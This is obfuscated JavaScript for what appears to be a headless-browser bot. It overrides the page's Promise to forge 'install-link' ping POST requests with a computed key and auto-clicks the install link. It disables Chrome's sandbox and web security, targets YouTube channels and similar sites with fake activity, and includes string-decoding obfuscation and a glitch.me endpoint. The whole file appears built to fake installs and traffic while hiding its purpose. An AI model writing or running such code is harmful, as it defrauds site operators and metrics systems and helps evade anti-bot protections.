                J[0x9 * 0x432 + 0x3 * -0x147 + 0x21dd * -0x1] = this['block'], J[K >> 0x1ce0 + 0xd * -0x37 + -0x537 * 0x5] |= x[-0xd33 + 0x10e4 + 0x6 * -0x9d & K], this['block'] = J[-0x14f0 + 0x84e * -0x1 + 0x1d4e], K >= -0xb * 0xcf + -0x24f2 + -0x1 * -0x2e0f && (this['hashed'] || this['hash'](), J[0x1 * -0x8ad + 0x1 * -0x515 + 0xdc2] = this['block'], J[-0x229 * 0xa + -0x125 * 0x22 + -0x1 * -0x3c94] = J[-0x638 + -0x1bcb + 0x2204] = J[0xa11 + 0x3 * -0x58a + 0x68f] = J[0x12 * -0xf4 + 0x1 * -0x9e + 0x11c9] = J[0x18fe + -0x23f + -0x17 * 0xfd] = J[0xaa3 + 0x1ef3 + -0x2991] = J[-0x780 + 0x14f9 + -0x139 * 0xb] = J[0x17f * -0xd + -0x9 * -0x25e + -0x1d4] = J[0x197b + 0xdc7 + -0x273a] = J[-0x9 * 0x9e + -0x137 * 0x1 + 0x6ce * 0x1] = J[-0x246c + 0xff8 + -0x56 * -0x3d] = J[-0xcf7 * 0x2 + 0x131b + -0x6de * -0x1] = J[-0xd * -0x56 + 0x5 * 0x9b + -0x759] = J[0x2 * -0x7b + 0x1df7 + -0x73d * 0x4] = J[-0x1 * 0x6b + 0x1d18 + -0x1c9f] = J[-0x15b + 0x21a7 + -0x189 * 0x15] = 0x12 * 0xe9 + -0x1663 * 0x1 + 0x1d * 0x35), J[0x770 + 0x114a + 0x1 * -0x18ac] = this['hBytes'] << -0x3fe + 0x21 * -0x37 + -0x238 * -0x5 | this['bytes'] >>> 0xf52 + -0x2 * -0x110b + -0x1 * 0x314b, J[0x45c + -0x205f + -0xe09 * -0x2] = this['bytes'] << 0xab8 + 0x1 * -0xf57 + -0x2 * -0x251, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x92 * 0x11 + -0xaa * 0x20 + 0x1f02; J < 0x1 * 0x1cdd + -0x7 * 0x77 + -0x194c; ++J)
                K = Q[J - (-0x5 * 0x437 + 0x68c + 0xe8a)] ^ Q[J - (-0x2 * -0x388 + -0x5 * -0x64a + 0xa * -0x3d9)] ^ Q[J - (0x1e83 + -0x374 + -0x1b01)] ^ Q[J - (0x12b4 * 0x1 + 0x4b2 * -0x2 + -0x940)], Q[J] = K << 0x1f67 + 0xbbf + -0x1 * 0x2b25 | K >>> -0x5 * -0x173 + 0x1772 + 0x25a * -0xd;
              for (J = 0xa81 * -0x2 + 0x1 * 0x2022 + 0x590 * -0x2; J < -0x164 * 0xc + 0x244a + 0x341 * -0x6; J += 0x219b + 0x17 * 0x13a + -0x1 * 0x3dcc)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x29 * 0xe5 + -0xfb8 + -0x14f0 | L >>> -0x2 * -0xc3e + 0x2c * 0xe + -0x1 * 0x1ac9) + (M & N | ~M & O) + P + (-0x9ba9c06f * 0x1 + -0x4dbb0e * -0x88 + 0x68 * 0x1f850df) + Q[J] << -0x2 * 0x1056 + -0x5 * 0x447 + 0x360f) << 0xae5 * -0x2 + 0x1 * 0x8af + -0x78 * -0x1c | P >>> 0x397 * -0x7 + -0x27e * -0x6 + 0x2 * 0x524) + (L & (M = M << 0x1c * -0x1a + 0x2 * -0x349 + 0x988 | M >>> 0x22 + -0x19 * -0x6a + -0x3 * 0x37e) | ~L & N) + O + (0x2 * 0x4ea62eef + -0x3ad * -0x1dd3cb + 0x29 * -0x44d9854) + Q[J + (-0x1956 + -0xf8d + 0x28e4)] << -0xe5 + -0xe50 + 0xf35) << 0x2625 + -0x185 * -0x1 + -0xc7 * 0x33 | O >>> 0x1c04 + 0x2227 + -0x3e10) + (P & (L = L << 0x17a * 0x15 + -0x5f7 * -0x5 + -0x3cb7 | L >>> -0x1 * -0x52c + -0x30b + -0x3 * 0xb5) | ~P & M) + N + (-0x1 * 0x88c2869f + 0x2a7fb2f * -0x40 + -0x8 * -0x31a8797f) + Q[J + (0x16f4 + 0x108a + 0x214 * -0x13)] << 0x7 * 0x10f + -0x216f * -0x1 + -0x8 * 0x51b) << -0xd70 + 0x8 * 0x1cf + -0x1 * 0x103 | N >>> 0x25ef * 0x1 + 0x4c6 + -0x2a9a) + (O & (P = P << -0x951 * -0x2 + -0xd8b + 0x4f9 * -0x1 | P >>> -0x1314 + 0x7 * 0x532 + -0x1 * 0x1148) | ~O & L) + M + (-0xa96f8200 + -0x49330981 * 0x2 + -0x196580e9b * -0x1) + Q[J + (-0xa4 * -0x21 + -0xa * -0x70 + 0x1981 * -0x1)] << 0x4 * -0x462 + -0x5b * 0x1d + 0x1bd7) << 0x7a1 + -0x1519 + 0xd7d | M >>> -0x1 * 0xc73 + -0x11 * 0x171 + 0x250f) + (N & (O = O << -0x1 * -0x1237 + 0x3b * 0x8f + -0x330e | O >>> 0x1aa1 + 0x4b4 + -0x1f53) | ~N & P) + L + (0x3e026abe + -0x166c42 * -0x20e + 0x17 * -0xc394e7) + Q[J + (-0x1713 + 0x1e1a + 0x167 * -0x5)] << -0x2499 + -0x2139 + 0x45d2, N = N << -0x2b7 * -0x4 + -0x1 * 0x1cfa + -0x6 * -0x30a | N >>> -0x1b41 + -0x16d * -0x19 + 0x862 * -0x1;
              for (; J < -0x2689 + 0xfd + 0x25b4; J += 0x52 * 0x19 + -0x1 * -0x1cd1 + -0x2 * 0x1267)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xcb6 * -0x1 + -0x526 + 0x78b * -0x1 | L >>> 0x712 + -0xb * 0x33d + 0x1ca8) + (M ^ N ^ O) + P + (0x2e931 * 0x2bf9 + 0x61ebdd0d + -0x7311fd15) + Q[J] << 0x19c + -0x12b4 + 0x1118) << 0x1 * 0x1f66 + -0x150e + -0xa53 * 0x1 | P >>> -0x41 * -0x7a + -0x113 * -0xb + -0x2ab0) + (L ^ (M = M << 0x1 * 0xbf + 0x198e + -0x1a2f * 0x1 | M >>> -0x1484 * -0x1 + -0xb1a + -0x1 * 0x968) ^ N) + O + (-0x1 * -0x309fceb1 + 0x8ca84c08 + -0x8 * 0x9cdc5e3) + Q[J + (0x1ed * 0x5 + -0x18eb + -0x30f * -0x5)] << 0x1da4 * 0x1 + -0x1eb * -0x1 + 0x1 * -0x1f8f) << 0x180f + -0x7be + -0x104c | O >>> 0x474 + -0x108f + 0x3 * 0x412) + (P ^ (L = L << -0x91d * -0x3 + -0x39 * 0x6b + 0x1b3 * -0x2 | L >>> -0x15ab + 0x84f * 0x2 + -0x103 * -0x5) ^ M) + N + (-0x56c0ad * -0x1ea + -0xdd46d * -0xe8c + -0x10061011d) + Q[J + (-0x127d * -0x2 + 0x204d + -0x4545 * 0x1)] << 0xe8a + -0x1701 + 0x877) << -0x1 * 0x12f6 + 0x1a1a + 0x71f * -0x1 | N >>> 0x1985 * 0x1 + -0x1 * 0x9cb + -0xf9f) + (O ^ (P = P << 0x119 * -0x16 + 0xa42 + 0xe02 | P >>> -0x1754 + 0xbc3 * 0x1 + 0xb93) ^ L) + M + (-0x26f9781e + -0xc277a * -0xf0f + 0x153f67f * -0x19) + Q[J + (0x1efc + -0x13cc + -0xb2d * 0x1)] << -0x7af + -0x1daa + 0x2559) << -0x5 * -0x44f + 0x8f9 + -0x1e7f | M >>> 0x1 * -0x32 + 0x7fa + -0x7ad) + (N ^ (O = O << 0x16 * -0xe4 + 0x7 * 0x3ad + -0x43 * 0x17 | O >>> -0xe * -0x1b1 + 0x19a8 + -0x3154) ^ P) + L + (0x10d * 0x732aca + 0x4c1cec3b + -0x12b * 0x49de94) + Q[J + (-0x194 + -0xe7d * 0x1 + -0x1015 * -0x1)] << 0x144 * 0x12 + -0x1c29 + 0x561, N = N << 0x314 * -0x6 + -0x1 * -0x263b + -0x13a5 | N >>> 0xe80 + 0x1201 + -0x207f;
              for (; J < -0x1640 + 0x2e6 + -0x6d * -0x2e; J += -0x1e95 * 0x1 + -0x392 + 0x222c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * 0x30a + -0x1 * -0x12ff + 0x1 * -0x1604 | L >>> 0x73 * -0x21 + 0x54a * -0x5 + 0x8 * 0x52c) + (M & N | M & O | N & O) + P - (-0x2e64c1d * -0x12 + -0xc1763f4c + 0xfe292866) + Q[J] << -0x19ef + 0x1 * -0x71 + 0x10 * 0x1a6) << -0x119c + -0x377 * 0x1 + 0x1518 | P >>> -0x21f9 + -0x87c + 0x2a90) + (L & (M = M << 0xb4d + 0x381 + -0xeb0 | M >>> -0xbb9 * -0x1 + 0x1d56 + -0x290d) | L & N | M & N) + O - (-0x7cd5453 * -0x11 + 0x31b3a0d3 * -0x3 + 0x815c8c1a) + Q[J + (-0x5 * 0x616 + 0x874 + 0x15fb)] << 0x535 * -0x2 + 0xe53 + -0x3e9) << 0x22d0 + -0x2 * -0xd3a + -0x3d3f | O >>> -0xcea + 0x2 * -0xefa + 0x2af9) + (P & (L = L << 0x18d8 + 0x2365 + -0x1 * 0x3c1f | L >>> 0x1 * 0x183b + 0x4 * 0x7d3 + -0x3d * 0xe9) | P & M | L & M) + N - (-0x6bbd1e6e * 0x1 + 0x4051517 * 0x9 + 0xb873a3c3) + Q[J + (-0xdc5 + 0x740 + -0x687 * -0x1)] << -0x1 * -0x175d + -0x1c * -0xad + 0x1b1 * -0x19) << 0x7 * 0xce + -0x1a2f + 0x1 * 0x1492 | N >>> 0x1 * -0x1cc9 + -0x153c + 0x3220) + (O & (P = P << 0x2334 + 0x16cf * 0x1 + -0x39e5 | P >>> 0x25e + -0x234 * 0x5 + 0x4 * 0x22a) | O & L | P & L) + M - (0x2e023cd * -0x13 + -0x157e5 * 0x62b4 + 0x12c1e625f) + Q[J + (0x6c * 0x47 + 0x4e5 * 0x2 + -0x27bb)] << 0x1b0a + -0x1596 + -0x574) << -0x11a5 * 0x1 + -0x71 * 0x25 + 0x21ff | M >>> -0xf * 0x1cf + -0x94 + 0x1bd0) + (N & (O = O << -0x3b * -0xd + 0x81 * 0x18 + -0xef9 * 0x1 | O >>> 0x2 * 0x12ee + -0x107e + 0x1 * -0x155c) | N & P | O & P) + L - (0x1b33f * -0x839b + -0x49e8e2e4 + 0x19a8dea2d) + Q[J + (0x3 * 0xc52 + -0x1ebf + -0x633)] << 0x9d * -0x13 + 0x2289 + -0xca * 0x1d, N = N << 0x8 * 0x10d + -0x5 * 0x377 + 0x9 * 0x101 | N >>> 0x119c + 0x2368 + 0xa * -0x54d;
              for (; J < 0x2 * 0xd23 + -0x1020 + -0x1 * 0x9d6; J += -0x545 * -0x1 + 0x5cb * 0x5 + -0x13 * 0x1cd)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x4 * -0x23 + 0x5f * 0x64 + -0x25a3 | L >>> -0x3b * -0x69 + -0x1168 + 0x1 * -0x6b0) + (M ^ N ^ O) + P - (-0x15a7 * -0x24c02 + 0x35a80a5 * -0x1c + 0x61c790e8) + Q[J] << 0x89 * 0x47 + 0x38 * -0x26 + -0x1 * 0x1daf) << 0x515 + 0x9d * -0x13 + 0x697 | P >>> -0x398 + -0x14ef * -0x1 + -0x113c) + (L ^ (M = M << 0x176b + -0x41e + 0x1 * -0x132f | M >>> 0xb45 + -0x26cc + 0x1b89) ^ N) + O - (0x95f9921 + 0x65a2c6af + -0x396521a6) + Q[J + (0x1c2d + -0x7e5 + -0xb3 * 0x1d)] << 0xd * 0x3 + 0x7 * 0x343 + -0x1 * 0x16fc) << -0x1 * -0x1c26 + 0x406 + 0x2027 * -0x1 | O >>> 0x7b1 * 0x3 + -0x741 * 0x1 + 0xfb7 * -0x1) + (P ^ (L = L << -0x5 * 0xa9 + -0x1 * -0xd44 + -0x9d9 | L >>> -0x125 * 0x13 + -0x6a0 + 0x1c61 * 0x1) ^ M) + N - (0x1af65a6a + 0x18dcfe6 * -0x3d + 0x79716d8e) + Q[J + (-0x199c + -0x225b + 0x3bf9)] << -0x1b29 + 0x11b * -0x1d + 0x3b38) << -0x2b4 * -0x7 + -0x113c + -0x1ab | N >>> -0x20e1 + 0xe0 * 0x20 + 0x4fc) + (O ^ (P = P << 0xb9c + -0x12df * 0x1 + -0x1 * -0x761 | P >>> -0x1415 + -0x5b5 * 0x6 + 0x3655) ^ L) + M - (-0x62ca70ad + 0x5655840b + 0x42122acc) + Q[J + (-0x1 * -0x2172 + -0x1 * -0x102f + 0x845 * -0x6)] << 0x8 * 0x247 + 0x19b3 + -0x2beb) << -0x1da5 * 0x1 + 0xaf3 * 0x1 + 0x12b7 | M >>> -0x1d * -0x108 + 0x17ae + -0x357b) + (N ^ (O = O << -0x6c9 + -0x639 * -0x5 + 0x3 * -0x812 | O >>> 0xe1e + 0x8d5 + -0x16f1) ^ P) + L - (0x2614d527 + 0x1e1c8a15 * 0x1 + 0xd3b * -0x11a16) + Q[J + (0xc05 * 0x3 + -0x1646 * 0x1 + 0xdc5 * -0x1)] << 0x26c9 + -0x4f * -0x40 + -0x87 * 0x6f, N = N << -0x1 * 0x26bb + -0xba6 + 0x327f | N >>> -0x239d + -0x1c8b + 0x402a;
              this['h0'] = this['h0'] + L << 0x1 * -0x177b + 0x8 * -0x373 + 0x3313, this['h1'] = this['h1'] + M << -0x1 * -0x78d + -0x22bc + 0x1b2f, this['h2'] = this['h2'] + N << 0x2 * 0xf17 + 0x60 * -0x54 + -0xa9 * -0x2, this['h3'] = this['h3'] + O << 0x724 + -0x487 + -0x29d, this['h4'] = this['h4'] + P << 0xd * -0x1a1 + -0x17a9 + 0x2cd6;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x4b * 0x10 + -0x1ccf + 0x219b & 0x9f3 + 0x23 * 0xac + -0x2 * 0x10b4] + w[J >> -0x5 * -0x72b + 0x2385 + 0x1 * -0x4744 & -0x10c8 + 0x77a + -0x95d * -0x1] + w[J >> 0x2 * -0x1a8 + 0x8f * 0xd + -0x3df & -0x1185 + 0x17bb + 0x7 * -0xe1] + w[J >> -0xebf + -0x7e1 + 0x79 * 0x30 & -0xae7 * 0x2 + 0x1 * -0x11b1 + 0x278e] + w[J >> -0x5be + 0x21af * 0x1 + 0xc1 * -0x25 & -0x1 * -0x117a + 0x2 * -0x97c + 0x18d * 0x1] + w[J >> -0x5 * 0x72e + 0x1 * 0xe7d + 0xb * 0x1f3 & 0x16e1 * 0x1 + -0x1 * -0x1a25 + -0x30f7] + w[J >> -0x115 * -0xe + 0xe47 + -0x1d69 & 0x1 * 0xc68 + 0x21cf + -0x1714 * 0x2] + w[0x10 * -0x1f1 + 0x38 * 0x41 + 0x10e7 * 0x1 & J] + w[K >> -0x1a76 + 0xa2f + -0x5 * -0x347 & 0x326 * 0x1 + -0x11a + 0x1fd * -0x1] + w[K >> -0x2e * -0x94 + 0xd8 + 0x32 * -0x8c & 0x34e + 0xb06 + -0x119 * 0xd] + w[K >> 0x22cb + -0x1 * 0x10b1 + 0x301 * -0x6 & 0x72 * 0x3 + 0x2f * -0xc1 + 0x2228] + w[K >> 0x1 * -0x4a9 + 0x7eb + -0x1 * 0x332 & 0x249e + -0x1763 + 0x464 * -0x3] + w[K >> 0x1029 + 0x17b6 + -0x27d3 & 0xb8b + -0x67 * -0x21 + 0x18c3 * -0x1] + w[K >> -0x1 * 0x648 + 0x1 * 0xaa9 + -0x173 * 0x3 & -0x2a * -0xa6 + -0x4 * 0x163 + -0x15a1] + w[K >> -0x3 * -0xc97 + -0x203f + -0x582 & -0x6 * 0x4a8 + -0x1df4 + 0x39f3] + w[-0x1 * 0x3bb + 0x1879 * -0x1 + 0x5a7 * 0x5 & K] + w[L >> -0x39 * 0xa9 + 0x11bb + 0x1402 & -0x81f + 0x212 + -0x61c * -0x1] + w[L >> 0x3b * -0xd + 0x13 * -0xc2 + 0x117d & 0x1af9 + 0x5c5 * -0x1 + 0x1525 * -0x1] + w[L >> -0x35e * -0xa + 0x1 * 0x1fe1 + -0x4179 & -0x1401 + -0xecb + 0x22db] + w[L >> 0x2 * 0xfc3 + 0x1d1d + -0x3c93 & 0x1a7 + 0x6e + 0x4a * -0x7] + w[L >> -0x1081 * -0x1 + -0x21 * 0x68 + -0x1 * 0x30d & -0x71a + 0x156a + 0x1 * -0xe41] + w[L >> -0x6ce + -0x107b + -0x7f * -0x2f & 0x1721 + -0x23 * -0x1d + -0x1b09] + w[L >> 0x928 * -0x4 + -0x2 * -0xff0 + 0x5 * 0xf4 & -0x17cb + 0x2193 + 0x1 * -0x9b9] + w[0x1708 + -0xd3f + -0x1f2 * 0x5 & L] + w[M >> 0x1ef + -0x7 * -0x50 + 0x403 * -0x1 & 0x2568 * 0x1 + -0xbb * 0x2b + -0x8 * 0xbe] + w[M >> -0x3 * -0xa97 + 0x1 * -0xdeb + -0x2 * 0x8e1 & 0x174 + -0x137d + 0x1218] + w[M >> 0x1a14 + -0xe93 + 0x27 * -0x4b & 0x4c7 * -0x5 + 0x4 * -0x6dc + 0x3362] + w[M >> 0xe9 * -0x13 + 0x3d * -0x7f + 0x2f9e & 0x12e8 * 0x1 + 0x1 * 0x13ed + -0x26c6] + w[M >> -0x177 * 0x14 + 0x175d + 0x5fb * 0x1 & -0x496 * -0x5 + -0x1c16 + 0x537] + w[M >> 0x22a + 0x61d * -0x3 + 0x1 * 0x1035 & -0x8f * -0x37 + -0x1 * -0x1fb7 + -0x3e61 * 0x1] + w[M >> -0x1 * 0x1cbd + -0x1fd7 + 0x7 * 0x8a8 & 0x6bc * 0x1 + -0x1 * -0xbd5 + -0x1282] + w[0x563 * 0x2 + 0x3 * -0xa13 + 0x1382 & M] + w[N >> -0x1 * -0x54f + 0x1 * -0x234e + -0x7 * -0x44d & 0x393 + -0x1d98 + 0xd0a * 0x2] + w[N >> 0x2266 + 0xb5 * -0x1d + -0xdcd & 0x100c + -0x149 * 0xa + -0x323 * 0x1] + w[N >> 0x43 * -0x67 + -0xf1 * 0x22 + -0x5 * -0xbcf & -0x2c4 * -0x5 + 0x150d + -0x22d2] + w[N >> -0x2 * 0x957 + 0x78f + 0xb2f & -0x81 + 0x43f * -0x7 + 0x1e49] + w[N >> 0x24ff + 0x251 * 0xe + -0x4561 & 0x17e3 + 0x43d * -0x9 + 0xe51 * 0x1] + w[N >> 0x1ff7 + 0x244c + -0x443b & -0x36 * -0x7e + -0xa84 + -0x1001] + w[N >> 0x1 * -0x871 + 0x12b6 + 0x19 * -0x69 & 0x128e + 0x3c2 + -0x279 * 0x9] + w[-0x226d + -0x494 * -0x5 + 0xb98 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x16bf + 0x128f + 0x448 * 0x1 & 0x1753 + -0x299 + -0x1 * 0x13bb,
                J >> -0x221 * -0x7 + -0x2 * -0x353 + -0x157d * 0x1 & 0x55a + -0x24b5 + -0x65 * -0x52,
                J >> -0x1c5 + -0x13e8 + -0x15b5 * -0x1 & 0x1b57 * 0x1 + 0x47 * -0x85 + 0xa8b,
                -0x14 * 0xcb + 0x921 + 0x7ba & J,
                K >> -0x57d + -0x82d * -0x1 + -0x298 & -0x33d + -0x2 * 0x44f + 0xcda,
                K >> -0x1 * 0x159b + -0x1 * -0x1049 + 0x2 * 0x2b1 & -0x43b + 0x16e9 * 0x1 + 0x9 * -0x1f7,
                K >> -0x228b * 0x1 + 0x1 * 0x1f0f + -0x96 * -0x6 & 0xf99 + 0x16af + -0x1 * 0x2549,
                -0x3 * 0x557 + -0x1567 * -0x1 + -0x463 & K,
                L >> -0x25d7 + 0x161c + 0xfd3 & -0xb21 * 0x1 + 0xd63 * 0x1 + -0x11 * 0x13,
                L >> -0x4 * 0x49d + -0x910 + 0x5 * 0x584 & 0x3cf + -0x2b5 + -0x1 * 0x1b,
                L >> -0x1390 * -0x1 + 0x1c95 + -0x301d & 0x39 + 0xd0a * -0x1 + 0xdd0,
                -0x1f8 + -0x1c01 + 0x3df * 0x8 & L,
                M >> 0x4 * -0x29 + 0x936 * -0x1 + -0x4f9 * -0x2 & -0x255f + -0x14ce * 0x1 + -0xe * -0x43a,
                M >> 0x1d * 0x57 + -0x1071 + 0x6a6 & 0x209a + 0x1b * 0xa4 + -0x30e7,
                M >> 0xad2 + 0x4 * -0x197 + -0x7 * 0xa2 & -0x119f + -0x28f * 0x6 + 0x21f8,
                -0x112a + -0x1733 * -0x1 + -0x50a & M,
                N >> -0xff6 + -0x139e + 0x23ac & 0x2f * -0xc7 + -0x1 * 0x190c + 0x3e94,
                N >> 0x901 + -0x26b0 + 0x5f3 * 0x5 & 0x219e + 0x5 * 0x694 + -0x4183 * 0x1,
                N >> 0xe * 0x14d + 0x1ab4 + 0x6 * -0x77b & -0xb7 * 0x27 + -0x22ee + 0x3fce,
                0x1cec + 0x222b * -0x1 + 0x1 * 0x63e & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x4 * -0x5f2 + 0x1 * -0x1637 + -0x1 * -0x2e13), (K = new DataView(J))['setUint32'](0x236 * 0x6 + -0x4 * 0x926 + -0xbaa * -0x2, this['h0']), K['setUint32'](-0x159a + -0x19 * 0x115 + 0x30ab, this['h1']), K['setUint32'](0x1032 + -0x1ce6 + -0x14 * -0xa3, this['h2']), K['setUint32'](-0x5 * -0x373 + 0xf7 * 0x1a + -0x5 * 0x875, this['h3']), K['setUint32'](-0x1 * -0x1294 + 0x22a * 0x5 + -0x1d56, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x1 * 0x1acb + -0x1d22 + 0x37ed];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x119e + -0x203f + 0xb9 * 0x45;
            J[-0x1a82 + 0x3eb * -0x9 + 0x3dc5]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x5 * -0x79 + -0x3 * 0x73f + 0x1f * 0xa0] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x171b + 0x19d9 + -0x2bd), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x1 * 0x26f1 + -0x1 * 0xb04 + -0x1bec;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x1ab * 0x6 + 0x1 * 0x1e5f + -0x2285), Promise['resolve'](0x2ea * 0x2 + 0x195d + -0x1f30);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1407 * 0x1 + -0x1 * 0xa39 + -0x79 * -0x40; j < -0x26e4 + -0x1377 + 0x3a5c; j++)
    i();
}
const NETWORK_PATIENCE = 0x5 * 0x3cf + 0xdf4 + -0x1bf + (0x1 * 0x1b1 + -0xa7 * 0x1c + 0x1c4b) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x3ff * -0x6 + 0x1cc3 + -0x263 * 0x2) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x11f4 * 0x2 + -0x388 + 0x2770; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1009 * -0x2 + -0x2 * 0x1239 + 0x1 * 0x4484);
    let h = e[f];
    if (b['hFFyAi'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x22a + 0xde8 + 0x2 * -0x5df, s, t, u = -0xf79 * 0x1 + 0x20ac + 0x1 * -0x1133; t = n['charAt'](u++); ~t && (s = r % (0x1ce1 + 0x985 * 0x1 + 0x22 * -0x121) ? s * (0xb3a * -0x2 + -0x1032 * -0x1 + -0x77 * -0xe) + t : t, r++ % (-0xe29 * 0x2 + -0x5e8 + 0x223e)) ? p += String['fromCharCode'](-0x9ac + -0x5 * -0x407 + -0x978 & s >> (-(-0x1a0b + 0x236e + -0x961) * r & 0x1 * 0x1723 + 0x24c * 0x11 + 0x1 * -0x3e29)) : -0x74 * -0x1 + -0x178a + -0xc5 * -0x1e) {
          t = o['indexOf'](t);
        }
        for (let v = 0x25f * -0xd + 0x17cd + 0x383 * 0x2, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x56b + 0x6 * -0x5d2 + 0x1 * 0x2867))['slice'](-(-0x197a + -0x1b0a + 0x51 * 0xa6));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x7cd * -0x4 + 0x1 * -0x21fd + 0x2c9,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x1414 + 0x1 * 0x221f + -0x3633; u < -0x23 * 0xe5 + 0xba6 + 0x14a9; u++) {
          p[u] = u;
        }
        for (u = 0x237f * -0x1 + 0x239b + -0x2 * 0xe; u < -0xeca + 0x28a * -0x5 + -0x71f * -0x4; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0xa9a + -0x101 * -0x19 + -0xd7f), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1b2d + -0x1be9 + 0xbc, q = 0x5b * 0x49 + 0xb * 0x242 + -0x1 * 0x32c9;
        for (let v = -0x202d + -0x67c * 0x3 + 0x33a1; v < n['length']; v++) {
          u = (u + (0x1e77 + 0x538 + -0x23ae)) % (0x73b + -0x1 * -0x866 + -0xea1), q = (q + p[u]) % (0x1 * -0x85f + 0x2680 + -0x1d21), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1 * 0x66a + 0x18fe + -0x1e68)]);
        }
        return t;
      };
      b['YzmPLy'] = m, c = arguments, b['hFFyAi'] = !![];
    }
    const j = e[0xf45 + 0x13a + -0x107f],
      k = f + j,
      l = c[k];
